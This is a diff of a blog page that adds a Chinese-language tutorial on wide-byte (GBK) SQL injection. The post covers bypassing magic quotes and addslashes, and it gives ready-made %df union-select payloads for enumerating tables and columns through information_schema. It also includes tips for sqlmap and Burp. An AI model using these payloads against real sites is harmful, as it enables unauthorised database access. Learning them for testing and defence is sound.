@@ -20,17 +20,17 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="宽字节,顾名思义,构造宽字节进行注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="宽字节注入">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="宽字节,顾名思义,构造宽字节进行注入">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:29:51.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:29:51.402Z">
+<meta property="article:modified_time" content="2023-08-21T11:12:03.877Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
@@ -222,11 +222,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:29:51" itemprop="dateCreated datePublished" datetime="2023-08-21T16:29:51+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:29:51 / 修改时间：19:12:03" itemprop="dateCreated datePublished" datetime="2023-08-21T16:29:51+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">宽字节,顾名思义,构造宽字节进行注入</div>
 
         </div>
       </header>
@@ -237,7 +248,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>不让你闭合的一个函数</p>
+<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>在PHP的低版本中,是需要修改配置文件,全局强行执行的: magic_quotes_gpc</p>
+<p>但是在高版本中,删除掉了这个配置,通过特定的函数进行过滤:addslashes()</p>
+<h2 id="如何绕过魔术引号"><a href="#如何绕过魔术引号" class="headerlink" title="如何绕过魔术引号?"></a>如何绕过魔术引号?</h2><h3 id="1-找不需要闭合的注入点"><a href="#1-找不需要闭合的注入点" class="headerlink" title="1.找不需要闭合的注入点"></a>1.找不需要闭合的注入点</h3><p>例如猫舍,select * from news where id=1</p>
+<h3 id="2-仔细查看作用域"><a href="#2-仔细查看作用域" class="headerlink" title="2.仔细查看作用域"></a>2.仔细查看作用域</h3><p>魔术引号是作用于cookie,post和get传参的,所以例如head注入可以尝试($_SEVRVER)</p>
+<h3 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h3><h1 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h1><p>GBK编码:双字节编码<br>单字节编码:ASCII上能找到的都是单字节编码</p>
+<p>\  ==&gt;  ASCII(92)  是个单字节<br>两个单字节 ==&gt; 双子姐</p>
+<p>因此,数据库使用GBK编码可能存在宽字节注入</p>
+<h2 id="核心"><a href="#核心" class="headerlink" title="核心:"></a>核心:</h2><p>穿一个字符将反斜杠吃掉</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1?\&#x27;</span>     <span class="string">&#x27;or 1=1-- qwe</span></span><br></pre></td></tr></table></figure>
+<h1 id="注入实现"><a href="#注入实现" class="headerlink" title="注入实现"></a>注入实现</h1><h2 id="df与-可以组成汉字运"><a href="#df与-可以组成汉字运" class="headerlink" title="%df与/可以组成汉字运"></a>%df与/可以组成汉字运</h2><p>/    ==&gt;   %5c</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- qwwe</span></span><br></pre></td></tr></table></figure>
+<h2 id="后续引号处理问题"><a href="#后续引号处理问题" class="headerlink" title="后续引号处理问题"></a>后续引号处理问题</h2><p>当需要查查询列名时,会需要用到where table_name=’xxx’的操作,但是这里的引号还是会被转义,有两个解决办法</p>
+<h3 id="1-套娃"><a href="#1-套娃" class="headerlink" title="1.套娃"></a>1.套娃</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema = database() limit 0,1)-- qwwee</span></span><br></pre></td></tr></table></figure>
+<p>即将表名变为子查询语句,但是太繁琐</p>
+<h3 id="2-十六进制法"><a href="#2-十六进制法" class="headerlink" title="2.十六进制法"></a>2.十六进制法</h3><p>MySQL支持十六进制输入替代字符串(0x….)</p>
+<p>即查出表名的十六进制,替换表明计科</p>
+<h1 id="sqlmap跑的细节"><a href="#sqlmap跑的细节" class="headerlink" title="sqlmap跑的细节"></a>sqlmap跑的细节</h1><p>如果跑sqlmap则需要先在url后面加上一个单字节%df,否则软件跑不出来</p>
+<h1 id="post表单怎么进行-df"><a href="#post表单怎么进行-df" class="headerlink" title="post表单怎么进行%df?"></a>post表单怎么进行%df?</h1><p>因为不走url,所以原则上是不会进行url编码的,因此不能直接写%df</p>
+<p>正确的做法是  :<br>1.先用一个字母代替,然后再burp中的hex里修改这个字母为df<br>admina’or 1=1— qwe</p>
+<p>2.如果当前页面是utf-8编码,则可以在表单内传一个汉字,比如聂,是%e8%81%32后面加单引号则被识别组成为两个汉字,右单引号逃逸.</p>
+
     </div>
 
     
@@ -262,6 +294,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
 
         
 
@@ -335,6 +370,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7"><span class="nav-text">魔术引号</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7"><span class="nav-text">如何绕过魔术引号?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%89%BE%E4%B8%8D%E9%9C%80%E8%A6%81%E9%97%AD%E5%90%88%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">1.找不需要闭合的注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BB%94%E7%BB%86%E6%9F%A5%E7%9C%8B%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">2.仔细查看作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">3.宽字节注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">宽字节注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83"><span class="nav-text">核心:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0"><span class="nav-text">注入实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#df%E4%B8%8E-%E5%8F%AF%E4%BB%A5%E7%BB%84%E6%88%90%E6%B1%89%E5%AD%97%E8%BF%90"><span class="nav-text">%df与&#x2F;可以组成汉字运</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E5%BC%95%E5%8F%B7%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="nav-text">后续引号处理问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%A5%97%E5%A8%83"><span class="nav-text">1.套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%B3%95"><span class="nav-text">2.十六进制法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E8%B7%91%E7%9A%84%E7%BB%86%E8%8A%82"><span class="nav-text">sqlmap跑的细节</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#post%E8%A1%A8%E5%8D%95%E6%80%8E%E4%B9%88%E8%BF%9B%E8%A1%8C-df"><span class="nav-text">post表单怎么进行%df?</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +393,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
